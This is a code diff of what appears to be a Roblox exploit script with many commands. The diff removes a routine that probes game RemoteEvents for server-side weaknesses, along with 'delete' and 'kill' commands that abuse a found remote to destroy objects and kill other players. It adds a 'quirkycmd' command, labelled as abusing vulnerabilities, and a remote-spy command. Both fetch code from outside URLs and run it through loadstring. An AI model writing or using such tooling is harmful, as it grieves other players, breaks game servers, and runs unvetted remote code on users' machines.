@@ -2104,6 +2104,17 @@ local function UX_unbind(keyName, bindId)
 	end
 end
 
+local function migrateBinds()
+	CONFIG.Binds = CONFIG.Binds or {}
+	for i, bd in ipairs(CONFIG.Binds) do
+		if not bd.id then
+			bd.id = mkBINDID()
+			bd.isPlugin = bd.isPlugin or false
+		end
+	end
+	UX_config()
+end
+
 local function mkPLUGINENV()
 	local function getString(idx, args)
 		if not args or #args < idx then return "" end
@@ -3639,94 +3650,18 @@ unexpected:addcmd("fling", "Enable/disable flinging", function(state)
     end
 end, nil, {"true/false"})
 
-local gear = LP:WaitForChild("StarterGear",1)
-local found
-local words = {"delete", "remove", "destroy", "clean", "clear", "bullet", "bala", "shoot", "shot", "fire", "segway", "handless", "sword", "attack", "despawn", "deletar", "apagar", "handto", "close", "löschen", "supprimer", "eliminar", "cancella", "entfernen", "enlever", "remover", "rimuovere", "zerstören", "détruire", "destruir", "distruggere", "reinigen", "nettoyer", "limpiar", "limpar", "pulire", "effacer", "borrar", "eliminare", "Geschoss", "balle", "proiettile", "schießen", "tirer", "disparar", "atirar", "sparare", "Schuss", "coup", "disparo", "tiro", "colpo", "feuer", "feu", "fuego", "fogo", "fuoco", "Segway", "handlos", "sans mains", "sin manos", "sem mãos", "senza mani", "schwert", "épée", "espada", "spada", "angriff", "attaque", "ataque", "attacco", "verschwinden", "disparaître", "desaparecer", "sparire", "消去", "削除", "破壊", "清掃", "クリア", "删除", "清除", "销毁", "清理", "手無", "無手", "手なし", "剣", "刀", "剑", "攻撃", "アタック", "攻击", "消失", "死去", "关闭", "關閉", "閉じる", "삭제", "제거", "파괴", "청소", "비우기", "suprimir", "canceller", "annettere"}
-local function valid(n)
-    n = n:lower()
-    for _,w in ipairs(words) do
-        if n:find(w) then return true end
-    end
-end
 
-local function scan(obj)
-    if not obj then return end
-    for _,v in ipairs(obj:GetDescendants()) do
-        if found then break end
-        if v:IsA("RemoteEvent") and not v:FindFirstChild("__FUNCTION")
-        and v.Parent and v.Parent.Name~="RobloxReplicatedStorage"
-        and valid(v.Name) then
+unexpected:addcmd("quirkycmd", "A script that abuses vulnerabilities", function()
+	setclipboard("https://discord.gg/xR5njqMU")
+	loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
+end, {"febypass"})
 
-            pcall(v.FireServer,v,gear)
-            task.wait(.5)
-
-            if not LP:FindFirstChild("StarterGear") then
-                found = v
-            end
-        end
-    end
-end
-
-unexpected:addcmd("[QUIRKY] check","Check for vulnerable remotes [Might trigger Anticheats]", function()
-    CLI.Text = ""
-	suggestion = ""
-	unexpected:notify("remote","Credits to 'quirkycmd' for the method!")
-	scan(RPS)
-    scan(LP:FindFirstChildOfClass("PlayerGui"))
-    scan(WS)
-    if not found then
-        for _,s in ipairs(game:GetChildren()) do
-            if found then break end
-            local c = s.ClassName:lower()
-            if c~="replicatedstorage" and c~="workspace" then
-                scan(s)
-            end
-        end
-    end
-    unexpected:notify("remote", found and ("Found: "..found:GetFullName()) or "No remote found")
-end,{"febypass"})
-
-function delete(instance)
-	if not found then return unexpected:notify("[QUIRKY] delete", "Run 'check' command first.") end
-	found:FireServer(instance, useSegway and {Value = instance} or nil )
-	unexpected:notify("[QUIRKY] delete", "deleted instance " .. instance.Name)
-end
-
-unexpected:addcmd("[QUIRKY] delete", "Delete an instance via remote abuse", function(instance)
-	delete(instance)
-end, {"del"}, {"name"})
-
-unexpected:addcmd("[QUIRKY] kill", "Kill a player via remote abuse", function(player)
-	if not player then return unexpected:notify("[QUIRKY] kill", "Usage: [QUIRKY] kill [player]") end
-	for _, p in ipairs(PLRS:GetPlayers()) do
-		if p.Name:lower() == player:lower() or p.DisplayName:lower() == player:lower() then
-			if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
-				delete(p.Character.HumanoidRootPart)
-				unexpected:notify("[QUIRKY] kill", "Killed " .. p.Name)
-				return
-			else
-				unexpected:notify("[QUIRKY] kill", p.Name .. " has no character.")
-				return
-			end
-		end
-	end
-	unexpected:notify("[QUIRKY] kill", "Player not found: " .. player)
-end, nil, {"player"})
+unexpected:addcmd("simplespy", "Spies on remotes.", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/audio-wav/unexpected-cmd/main/unexpected_assets/scripts/simplespy"))()
+end, {"remotespy"})
 
 hookEvents()
 hookBinds()
-
-local function migrateBinds()
-	CONFIG.Binds = CONFIG.Binds or {}
-	for i, bd in ipairs(CONFIG.Binds) do
-		if not bd.id then
-			bd.id = mkBINDID()
-			bd.isPlugin = bd.isPlugin or false
-		end
-	end
-	UX_config()
-end
-
 migrateBinds()
 UX_rconfig()
 
